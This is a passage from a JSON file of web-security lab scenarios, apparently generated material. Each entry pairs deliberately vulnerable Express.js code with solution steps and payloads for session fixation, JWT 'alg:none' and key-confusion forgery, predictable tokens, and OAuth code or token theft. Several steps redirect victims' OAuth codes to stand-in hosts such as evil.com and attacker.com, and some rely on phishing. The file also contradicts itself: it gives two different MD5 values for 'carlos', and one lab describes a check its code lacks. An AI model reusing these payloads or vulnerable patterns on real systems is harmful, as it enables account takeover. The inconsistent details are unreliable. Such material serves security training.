        "Trick victim to log in while using preset sessionid=attackersession123",
        "Use same sessionid=attackersession123 post victim login to hijack the session"
      ]
    },
    {
      "Lab scenario": "Session Fixation via Insecure Cookie Handling in Login Endpoint",
      "Lab Description": "The application's login flow allows session tokens to be set prior to authentication, and the token remains valid post-login. The application fails to invalidate pre-login session cookies. To solve: hijack a session by fixing the session token before authentication and access the target's account page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Using Burp Suite, intercept the GET /login request before logging in and note the issued session cookie.",
        "Log in using valid credentials while retaining the same session cookie manually set in the browser.",
        "Craft an attack scenario where you send the fixed session ID to the victim, encouraging them to log in using this session.",
        "After the victim logs in, reuse the fixed session token to gain access to their authenticated account.",
        "Visit /account with the victim's session to verify access and confirm lab completion."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'mypassword' }]; app.get('/login', (req, res) => { let sessionId = req.cookies.session || 'guest123'; res.cookie('session', sessionId); res.send('Session initialized.'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { res.send('Welcome ' + username); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account', (req, res) => { if (req.cookies.session === 'guest123') { res.status(403).send('Access denied'); } else { res.send('Account details for valid session holder'); } }); app.listen(4000);",
      "payloads": [
        "Set-Cookie: session=attackerKnownSession",
        "Manually reuse fixed session token post-login",
        "Session fixation with pre-set cookie prior to authentication"
      ]
    },
    {
      "Lab scenario": "JWT Token Tampering in Authorization Header",
      "Lab Description": "The application uses a JSON Web Token (JWT) for session control but does not validate the token signature properly. The application decodes the token but skips signature validation when the 'alg' header is set to 'none'. To solve: craft a JWT token with modified privileges to access the admin panel.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Postman to intercept the Authorization header and decode the JWT using jwt.io.",
        "Confirm the token uses the HS256 algorithm and note the payload structure.",
        "Modify the JWT 'alg' field to 'none' and change the user role in the payload to 'admin'.",
        "Reconstruct the token without a signature and use it in the Authorization header.",
        "Access /admin-panel and verify admin-level access to solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'weak_secret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username: username, role: 'user' }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin-panel', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (decoded.role === 'admin') { res.send('Admin access granted.'); } else { res.status(403).send('Access denied.'); } }); app.listen(4001);",
      "payloads": [
        "Header: {\"alg\":\"none\"}",
        "Payload: {\"username\":\"carlos\",\"role\":\"admin\"}",
        "Final Token: header.payload."
      ]
    },
    {
      "Lab scenario": "OAuth Authorization Code Interception in Redirect URI",
      "Lab Description": "The application relies on OAuth 2.0 authorization but accepts arbitrary redirect URIs after authorization. This allows attackers to intercept the authorization code. To solve: manipulate the redirect URI to capture Carlos's OAuth code and exchange it for an access token.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Using Burp Suite, observe the OAuth login flow and the redirection after the /authorize endpoint.",
        "Modify the redirect_uri parameter to point to your attacker-controlled server (e.g., http://attacker.com/callback).",
        "Trigger Carlos to initiate an OAuth flow via social engineering, intercept the code parameter at your callback server.",
        "Exchange the intercepted authorization code for an access token using Postman against the /token endpoint.",
        "Use the access token to request Carlos's profile via /api/user and confirm access."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.get('/authorize', (req, res) => { const { redirect_uri, code } = req.query; res.redirect(`${redirect_uri}?code=authcode123`); }); app.post('/token', (req, res) => { const { code } = req.body; if (code === 'authcode123') { res.json({ access_token: 'valid_token_carlos' }); } else { res.status(400).json({ error: 'Invalid code' }); } }); app.get('/api/user', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'valid_token_carlos') { res.json({ user: 'Carlos', email: 'carlos@example.com' }); } else { res.status(401).json({ error: 'Unauthorized' }); } }); app.listen(4002);",
      "payloads": [
        "redirect_uri=http://attacker.com/callback",
        "OAuth Authorization Code: authcode123",
        "Access Token: valid_token_carlos"
      ]
    },
    {
      "Lab scenario": "Session Mismanagement Flaw in Access Control for REST API",
      "Lab Description": "This application's REST API uses session IDs set via URL parameters rather than cookies. The server-side logic trusts any session ID provided in the URL without validating user context. To solve: steal and reuse a session ID from a public source to hijack an active session and access another user's sensitive data.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Using Burp Suite, intercept a GET /api/profile request and observe the session parameter in the URL.",
        "Use OWASP ZAP's Spider to enumerate all linked session IDs stored in JavaScript or comments.",
        "Extract an exposed session ID from a cached JavaScript file or history log.",
        "Replay the intercepted session ID by sending GET /api/profile?session=stolen-session-id in Postman.",
        "Confirm that the response returns another user's data and access the /api/admin endpoint for full privilege escalation."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const sessions = { 'abcd1234': 'carlos', 'efgh5678': 'admin' }; app.get('/api/profile', (req, res) => { const user = sessions[req.query.session]; if (!user) { return res.status(401).send('Invalid session'); } res.send(`Welcome back ${user}`); }); app.get('/api/admin', (req, res) => { const user = sessions[req.query.session]; if (user === 'admin') { res.send('Admin panel accessed'); } else { res.status(403).send('Forbidden'); } }); app.listen(5000);",
      "payloads": [
        "?session=abcd1234",
        "?session=efgh5678",
        "GET /api/profile?session=valid-session-id"
      ]
    },
    {
      "Lab scenario": "JWT Secret Exposure through Verbose Error Responses",
      "Lab Description": "This application's JWT implementation logs signature verification failures verbosely, accidentally revealing the HMAC secret in server debug logs. To solve: trigger error messages and extract the secret to forge a valid admin token.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Using Burp Suite, send an intentionally corrupted JWT to the /validate endpoint and observe server response headers and body.",
        "Use OWASP ZAP passive scanning to detect if error messages leak the HMAC secret.",
        "Once the secret appears in logs, reconstruct a valid JWT using jwt.io or Node.js jwt.sign() with role=admin.",
        "Use Postman to send the forged JWT in the Authorization header.",
        "Access the /admin-dashboard endpoint to confirm the token works and solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'superSecretDebugKey'; app.use(express.json()); app.post('/validate', (req, res) => { try { jwt.verify(req.body.token, secret); res.send('Token valid'); } catch (err) { res.status(401).send(`Verification failed: ${err.message} | Secret: ${secret}`); } }); app.get('/admin-dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = jwt.verify(token, secret); if (payload.role === 'admin') { res.send('Welcome Admin!'); } else { res.status(403).send('Access Denied'); } }); app.listen(5001);",
      "payloads": [
        "JWT with { \"alg\": \"HS256\", \"role\": \"admin\" }",
        "JWT Header: { \"alg\": \"none\" }",
        "JWT Signature using extracted 'superSecretDebugKey'"
      ]
    },
    {
      "Lab scenario": "OAuth Misconfiguration in Redirect URI Validation",
      "Lab Description": "The OAuth authorization server allows open redirect URIs with wildcard matching. An attacker can craft a malicious redirect_uri to intercept authorization codes. To solve: manipulate the redirect_uri to exfiltrate another user's OAuth code and redeem it for their access token.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Using Burp Suite, observe the OAuth flow and identify the wildcard nature of the redirect_uri parameter.",
        "Modify the redirect_uri parameter to point to http://evil.com/steal?code=.",
        "Trigger a victim user into clicking the OAuth login link by social engineering.",
        "On your server (http://evil.com), capture the authorization code from the URL.",
        "Send a POST request to the /token endpoint using Postman to exchange the intercepted code for an access token, then retrieve the victim's account info from the /profile endpoint."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/authorize', (req, res) => { const { redirect_uri } = req.query; if (redirect_uri.includes('http')) { return res.redirect(`${redirect_uri}?code=authcode123`); } res.status(400).send('Invalid redirect_uri'); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (code === 'authcode123') { res.json({ access_token: 'access-token-for-carlos' }); } else { res.status(400).json({ error: 'Invalid authorization code' }); } }); app.get('/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'access-token-for-carlos') { res.json({ username: 'carlos', email: 'carlos@example.com' }); } else { res.status(401).json({ error: 'Invalid token' }); } }); app.listen(5002);",
      "payloads": [
        "redirect_uri=http://evil.com/steal",
        "OAuth Authorization Code: authcode123",
        "access_token=access-token-for-carlos"
      ]
    },
    {
      "Lab scenario": "JWT signature confusion in token validation logic",
      "Lab Description": "The application uses JWT tokens for authentication but incorrectly validates the 'alg' field, trusting user-supplied algorithms. If the header specifies 'none', the signature check is skipped entirely. To solve: forge a JWT token assigning yourself 'admin' privileges and access the admin panel.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Intercept a valid JWT token using Burp Suite from the Authorization header.",
        "Use Postman to modify the JWT header by changing \"alg\" to \"none\" and removing the signature section.",
        "Send the manipulated token with 'role=admin' in the payload back in the Authorization header using Postman.",
        "Observe that the server accepts the token due to the 'none' algorithm and grants admin access.",
        "Visit /admin-dashboard using the forged token to solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.post('/login', (req, res) => { const token = jwt.sign({ username: req.body.username, role: 'user' }, 'supersecret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin-dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload.role === 'admin') { res.send('Welcome Admin!'); } else { res.status(403).send('Access Denied'); } }); app.listen(5003);",
      "payloads": [
        "JWT Header: { \"alg\": \"none\" }, Payload: { \"username\": \"admin\", \"role\": \"admin\" }",
        "JWT: eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
        "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."
      ]
    },
    {
      "Lab scenario": "Session Fixation through predictable session identifiers",
      "Lab Description": "The application issues session identifiers that are directly derived from the username in a weak hash form. An attacker can predict valid session tokens based on this pattern and hijack active sessions. To solve: predict and reuse a valid session ID to access Carlos's account page.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Using Burp Suite, log in with a known username and observe the session cookie format.",
        "Use OWASP ZAP to brute-force the MD5 hash of known usernames, confirming the session ID is md5(username).",
        "Craft a session cookie using the MD5 hash of 'carlos' (e.g., md5('carlos')).",
        "Set the forged session cookie in your browser using Burp Suite or Postman.",
        "Access /my-account and confirm Carlos's profile is displayed to solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const crypto = require('crypto'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.get('/login', (req, res) => { const session = crypto.createHash('md5').update(req.query.username).digest('hex'); res.cookie('session', session); res.send(`Session created for ${req.query.username}`); }); app.get('/my-account', (req, res) => { const sessions = { 'carlos': crypto.createHash('md5').update('carlos').digest('hex') }; if (req.cookies.session === sessions['carlos']) { res.send('Account details for carlos'); } else { res.send('Access denied'); } }); app.listen(5004);",
      "payloads": [
        "Session Cookie: 2c9a8e6e5d92c3cc2d244360d6b6742f (MD5 of 'carlos')",
        "Cookie: session=2c9a8e6e5d92c3cc2d244360d6b6742f",
        "GET /my-account with forged Cookie"
      ]
    },
    {
      "Lab scenario": "OAuth open redirect flaw in authorization endpoint",
      "Lab Description": "The OAuth provider used by this application allows redirection to arbitrary URLs under the same domain wildcard. This allows attackers to steal OAuth codes by tricking users into clicking crafted links. To solve: craft an OAuth URL that redirects to a malicious endpoint and extract a valid code.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Using Burp Suite, observe the authorization request and identify the redirect_uri parameter accepting wildcards.",
        "Alter the redirect_uri to redirect to http://attacker.com/callback within the allowed wildcard scope.",
        "Send the crafted OAuth link to a victim via phishing or social engineering.",
        "Capture the code on http://attacker.com/callback after the victim authenticates.",
        "Exchange the stolen code for a token at /oauth/token and access the victim's /profile via Postman."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/authorize', (req, res) => { const redirectUri = req.query.redirect_uri; if (redirectUri.startsWith('http://trusted.com')) { res.redirect(`${redirectUri}?code=stealable-code`); } else { res.status(400).send('Invalid redirect_uri'); } }); app.post('/oauth/token', (req, res) => { if (req.body.code === 'stealable-code') { res.json({ access_token: 'user-token' }); } else { res.status(401).json({ error: 'Invalid code' }); } }); app.get('/profile', (req, res) => { if (req.headers.authorization === 'Bearer user-token') { res.json({ username: 'carlos', email: 'carlos@example.com' }); } else { res.status(403).send('Access denied'); } }); app.listen(5005);",
      "payloads": [
        "redirect_uri=http://trusted.com.attacker.com/callback",
        "Authorization Code: stealable-code",
        "access_token=user-token"
      ]
    },
    {
      "Lab scenario": "Session Fixation via Pre-set Session ID in Login Endpoint",
      "Lab Description": "The application allows clients to specify a session ID before authentication is complete. The server trusts this session and associates it with the authenticated user without generating a new one. To solve: predefine a session ID, log in as your user, then reuse the same ID to hijack Carlos's session.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Use Burp Suite to capture the POST /login request while logging in with your own credentials.",
        "Notice the client-supplied session_id parameter being echoed back in the Set-Cookie header.",
        "Craft a session fixation attack by manually setting session_id to 'carlos-session' before login.",
        "Share the crafted session ID with the victim, or wait for them to log in using the same session_id.",
        "After Carlos logs in, access /my-account while sending the fixed session cookie to solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); let sessions = {}; app.post('/login', (req, res) => { const { username, password, session_id } = req.body; if (username === 'carlos' && password === 'supersecret') { sessions[session_id] = username; res.cookie('session', session_id).send(`Logged in as ${username}`); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user === 'carlos') { res.send('Account details for carlos'); } else { res.status(403).send('Access denied'); } }); app.listen(5006);",
      "payloads": [
        "POST /login session_id=carlos-session&username=wiener&password=peter",
        "Reuse session cookie: session=carlos-session",
        "GET /my-account with Cookie: session=carlos-session"
      ]
    },
    {
      "Lab scenario": "JWT None Algorithm Bypass in Authorization Header",
      "Lab Description": "The application uses JWT for session handling but fails to validate the signature when 'alg' is set to 'none'. The server mistakenly trusts the unverified payload. To solve: craft a JWT with admin privileges and access the admin section using the unsigned token.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Capture a valid JWT token using OWASP ZAP from an authenticated user request.",
        "Decode the token using jwt.io or Postman to inspect the header and payload.",
        "Modify the header to { \"alg\": \"none\" } and the payload to { \"username\": \"admin\", \"role\": \"admin\" }, omitting the signature.",
        "Resend the crafted JWT in the Authorization header via Postman.",
        "Visit /admin-panel and verify the server grants admin access, solving the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.get('/admin-panel', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload.role === 'admin') { res.send('Welcome to the Admin Panel'); } else { res.status(403).send('Access denied'); } }); app.listen(5007);",
      "payloads": [
        "{\"alg\":\"none\"}.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
        "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
        "Crafted JWT Token: No signature required"
      ]
    },
    {
      "Lab scenario": "OAuth Token Leakage through Referer Header",
      "Lab Description": "The application uses OAuth 2.0 but the authorization code is exposed in the Referer header when redirected back to the client site. An attacker controlling a subdomain can harvest tokens via referer leakage. To solve: intercept the Referer header during login flow and extract the OAuth code.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Using Burp Suite, initiate an OAuth login flow and observe the final redirect to the application’s /callback endpoint.",
        "Set up a malicious site (e.g., http://attacker.com) that embeds the OAuth provider's authorize URL in an iframe.",
        "When the victim authenticates, the Referer header in their redirected request to /callback will expose the OAuth code to attacker.com logs.",
        "Extract the stolen code and exchange it for an access token using Postman.",
        "Use the token to access /profile as the victim and solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/callback', (req, res) => { const code = req.query.code; console.log('Received OAuth Code:', code); res.send(`Welcome back! OAuth code ${code} stored.`); }); app.get('/profile', (req, res) => { if (req.headers.authorization === 'Bearer leaked-user-token') { res.json({ username: 'carlos', email: 'carlos@example.com' }); } else { res.status(403).send('Access denied'); } }); app.listen(5008);",
      "payloads": [
        "Embed URL: https://authserver.com/oauth/authorize?client_id=abc&redirect_uri=http://victim.com/oauth/callback",
        "Captured Referer Leak: http://victim.com/oauth/callback?code=leaked-code",
        "Authorization: Bearer leaked-user-token"
      ]
    },
    {
      "Lab scenario": "Session Hijacking via Predictable Session Tokens in REST API",
      "Lab Description": "The application's REST API uses a predictable session token generation scheme based on the username and a static salt. The application does not rotate the token post-login, allowing attackers to precompute tokens for valid users. To solve: predict Carlos's session token and access his profile endpoint.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Capture your own /api/login response using Postman and observe the returned token format.",
        "Reverse-engineer the token by analyzing the Base64-decoded structure, which is a concatenation of username and a static string.",
        "Manually craft a token for Carlos by applying the same pattern.",
        "Use the token in the Authorization header to query /api/user/profile.",
        "Verify successful access to Carlos's account and solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const users = [{ username: 'carlos', password: 'letmein' }]; app.use(bodyParser.json()); app.post('/api/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = Buffer.from(username + ':staticSalt').toString('base64'); res.json({ token }); } else { res.status(401).json({ error: 'Invalid credentials' }); } }); app.get('/api/user/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = Buffer.from(token, 'base64').toString(); if (decoded.startsWith('carlos')) { res.json({ username: 'carlos', email: 'carlos@example.com' }); } else { res.status(403).json({ error: 'Unauthorized' }); } }); app.listen(5010);",
      "payloads": [
        "Authorization: Bearer Y2FybG9zOnN0YXRpY1NhbHQ=",
        "Base64 of carlos:staticSalt",
        "Y2FybG9zOnN0YXRpY1NhbHQ="
      ]
    },
    {
      "Lab scenario": "JWT Signature Verification Bypass via Key Confusion Attack",
      "Lab Description": "The application uses JWTs to authorize users but fails to differentiate between HMAC and RSA algorithms. Attackers can forge valid tokens by switching the algorithm from RS256 to HS256 and signing it using the public key as the secret. To solve: forge an admin token and access the /admin route.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Intercept a valid JWT using Burp Suite during authentication.",
        "Download the public key from the exposed /.well-known/jwks.json endpoint.",
        "Craft a new token by changing the 'alg' header from 'RS256' to 'HS256' and sign it with the public key as the HMAC secret.",
        "Use the forged token in the Authorization header while requesting /admin.",
        "Confirm successful access to the admin section and solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const publicKey = fs.readFileSync('./public.pem'); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { jwt.verify(token, publicKey); const payload = jwt.decode(token); if (payload.role === 'admin') { res.send('Welcome Admin'); } else { res.status(403).send('Access denied'); } } catch (err) { res.status(401).send(err.message); } }); app.listen(5011);",
      "payloads": [
        "Header: {\"alg\":\"HS256\"}",
        "Payload: {\"username\":\"admin\",\"role\":\"admin\"}",
        "Signature: HMAC(publicKey, header.payload)",
        "Final JWT: [header].[payload].[signature]"
      ]
    },
    {
      "Lab scenario": "OAuth Implicit Flow Token Leak via URL Fragment Hijacking",
      "Lab Description": "The OAuth implementation uses the implicit flow and returns access tokens in the URL fragment. Due to a lack of client-side sanitization, an attacker can manipulate redirect URIs to capture tokens via malicious subdomains. To solve: intercept an OAuth token using a crafted redirect URI and access Carlos's data.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Initiate an OAuth login flow with Burp Suite and observe the redirect URL containing the access token in the URL fragment.",
        "Host a malicious redirect_uri like http://attacker.com/capture.html that reads window.location.hash and sends it to your server.",
        "Change the OAuth redirect_uri to http://attacker.com/capture.html and trick Carlos into logging in.",
        "Once Carlos logs in, capture the token and use Postman to authenticate to /private-data.",
        "Verify that you’ve accessed Carlos’s data and solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const tokens = { 'carlos-token': 'carlos' }; app.get('/private-data', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (tokens[token] === 'carlos') { res.json({ username: 'carlos', data: 'Sensitive info' }); } else { res.status(403).json({ error: 'Unauthorized' }); } }); app.listen(5012);",
      "payloads": [
        "Redirect URI: http://attacker.com/capture.html",
        "Captured Token: carlos-token",
        "Authorization: Bearer carlos-token"
      ]
    },
    {
      "Lab scenario": "GraphQL Session Fixation in Login Mutation",
      "Lab Description": "This lab’s GraphQL API suffers from session fixation due to insecure session token reuse. The application does not issue a fresh session ID upon login, allowing an attacker to fixate the victim's session. To solve: log in as Carlos after pre-setting the session token.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use OWASP ZAP to intercept the initial /graphql request and observe the Set-Cookie header with the session token.",
        "Send a crafted GraphQL mutation to login with your own credentials while retaining the fixed session token.",
        "Send the same session token to the victim, enticing them to log in (e.g., via social engineering).",
        "Once Carlos logs in, reuse the same fixed session token in your browser.",
        "Access /my-account using the hijacked session to solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const schema = buildSchema(`type Query { dummy: String } type Mutation { login(username: String!, password: String!): String }`); const users = [{ username: 'carlos', password: 'supersecure' }]; const root = { login: ({ username, password }, req) => { const user = users.find(u => u.username === username && u.password === password); if (user) { return req.cookies.session || 'fixed-session-token'; } else { throw new Error('Invalid credentials'); } } }; app.use('/graphql', graphqlHTTP((req) => ({ schema, rootValue: root, graphiql: true })) ); app.listen(5015);",
      "payloads": [
        "{\"query\":\"mutation { login(username: \\\"carlos\\\", password: \\\"supersecure\\\") }\"}",
        "Cookie: session=fixed-session-token",
        "GraphQL Mutation with valid credentials using pre-fixed session cookie"
      ]
    },
    {
      "Lab scenario": "JWT None Algorithm Acceptance in Authorization Header",
      "Lab Description": "This application trusts JWT tokens in the Authorization header without properly validating the algorithm field, accepting 'alg':'none'. Attackers can forge tokens without a valid signature. To solve: create an unsigned admin token and access the /admin-dashboard.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Capture a valid JWT token using Burp Suite during a login process.",
        "Modify the JWT header to set \"alg\" to \"none\" and strip the signature section.",
        "Change the payload to {\"username\":\"admin\",\"role\":\"admin\"}.",
        "Use Postman to send a request to /admin-dashboard with the forged Authorization Bearer token.",
        "Confirm that the admin dashboard is accessible and solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.get('/admin-dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload && payload.payload.role === 'admin') { res.send('Welcome, Admin!'); } else { res.status(403).send('Access denied'); } }); app.listen(5016);",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
        "{\"alg\":\"none\"} header JWT",
        "Unsigned admin JWT token"
      ]
    },
    {
      "Lab scenario": "OAuth Open Redirect and Token Leakage",
      "Lab Description": "This OAuth flow lacks proper redirect URI validation, allowing attackers to use open redirects to steal access tokens. The vulnerable behavior involves reflecting the access token in a user-controlled URL. To solve: steal Carlos's token via a malicious redirect URL and use it to access /private-files.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Using Burp Suite, observe the OAuth redirect flow and identify the lack of a whitelist for redirect_uri.",
        "Craft a malicious redirect_uri pointing to https://attacker.com/capture?token={access_token}.",
        "Send a phishing link to Carlos containing this redirect_uri and wait for him to authenticate.",
        "Intercept the token at your attacker-controlled endpoint.",
        "Replay the token in the Authorization header using Postman to access /private-files and solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.get('/auth/callback', (req, res) => { const { redirect_uri, token } = req.query; if (redirect_uri) { res.redirect(`${redirect_uri}?token=${token}`); } else { res.status(400).send('Missing redirect URI'); } }); app.get('/private-files', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'carlos-oauth-token') { res.send('Carlos confidential data'); } else { res.status(403).send('Unauthorized'); } }); app.listen(5017);",
      "payloads": [
        "https://attacker.com/capture?token={access_token}",
        "Authorization: Bearer carlos-oauth-token",
        "Phished token: carlos-oauth-token"
      ]
    },
    {
      "Lab scenario": "API Session Fixation via Predictable Session ID in REST Login",
      "Lab Description": "This application's REST login endpoint sets a session ID derived from the username hash, which can be predicted. The application fails to generate a new session token post-login. To solve: predetermine Carlos's session ID and access the /dashboard endpoint using this session.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite to intercept your own login attempt and observe the Set-Cookie session token format.",
        "Using NodeJS crypto library, predict the hash of the username 'carlos' to craft the expected session token.",
        "Manually set your browser's session cookie to the calculated 'carlos' token using Burp's 'Add Cookie' feature.",
        "Access the /dashboard endpoint with the forged session cookie.",
        "Confirm Carlos's account is accessible to solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const crypto = require('crypto'); const app = express(); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); app.use(bodyParser.json()); app.use(cookieParser()); const users = ['alice', 'carlos']; app.post('/login', (req, res) => { const { username, password } = req.body; if (users.includes(username) && password === 'Password123') { const session = crypto.createHash('md5').update(username).digest('hex'); res.cookie('session', session); res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/dashboard', (req, res) => { const session = req.cookies.session; if (session === crypto.createHash('md5').update('carlos').digest('hex')) { res.send('Welcome Carlos!'); } else { res.status(403).send('Access denied'); } }); app.listen(5020);",
      "payloads": [
        "d404559f602eab6fd2d2fef748b9d3c0",
        "Set-Cookie: session=d404559f602eab6fd2d2fef748b9d3c0",
        "Predict hash: MD5('carlos')"
      ]
    },
    {
      "Lab scenario": "JWT Signature Confusion Vulnerability in Bearer Authorization",
      "Lab Description": "The application uses JWT tokens but inconsistently verifies the signature algorithm. If a token uses 'HS256' instead of 'RS256', the server misinterprets the public RSA key as a shared HMAC secret, enabling signature spoofing. To solve: craft a signed HS256 token impersonating the admin and access /admin.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Capture a valid JWT using Burp Suite during a login process.",
        "Change the 'alg' in the header to 'HS256' and set the payload to {\"role\":\"admin\"}.",
        "Use the public RSA key (downloaded from the /.well-known/jwks.json endpoint) as the secret for HS256.",
        "Sign the token using any JWT library and send it via Authorization: Bearer.",
        "Access /admin and verify admin access is granted to solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const publicKey = fs.readFileSync('./public.pem'); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, publicKey); if (decoded.role === 'admin') { res.send('Welcome Admin!'); } else { res.status(403).send('Access denied'); } } catch (e) { res.status(401).send('Invalid Token'); } }); app.listen(5021);",
      "payloads": [
        "Header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}",
        "Payload: {\"role\":\"admin\"}",
        "Secret: [Public RSA Key from /.well-known/jwks.json]",
        "Valid HS256 signed admin token"
      ]
    },
    {
      "Lab scenario": "OAuth2 Implicit Flow Token Leak via Referer Header",
      "Lab Description": "This application uses OAuth2 implicit flow but embeds the access token in the URL fragment, causing the browser to leak the token via Referer headers. To solve: capture Carlos's token from the Referer log and replay it to access /protected.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to intercept browsing after OAuth login and observe Referer headers in outgoing requests.",
        "Identify requests where the access_token appears in the Referer header directed to third-party resources.",
        "Extract the leaked token and use Postman to send a GET request to /protected with Authorization: Bearer.",
        "Access the protected page and confirm Carlos's data is exposed.",
        "Log the token reuse to complete the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.get('/oauth-callback', (req, res) => { res.send('<script>location.href=\"/welcome#access_token=carlos-oauth-token\"</script>'); }); app.get('/protected', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'carlos-oauth-token') { res.send('Protected data for Carlos'); } else { res.status(403).send('Unauthorized'); } }); app.listen(5022);",
      "payloads": [
        "Referer: https://target.com/welcome#access_token=carlos-oauth-token",
        "Authorization: Bearer carlos-oauth-token",
        "Captured access_token from Referer log"
      ]
    },
    {
      "Lab scenario": "Session Fixation via URL-based Token in Single-Page Application",
      "Lab Description": "This lab's single-page login flow passes session identifiers via the URL rather than setting them after authentication. The application reuses this identifier without regenerating it upon successful login. To solve: inject your own crafted session ID before Carlos logs in and hijack the session when he authenticates.",
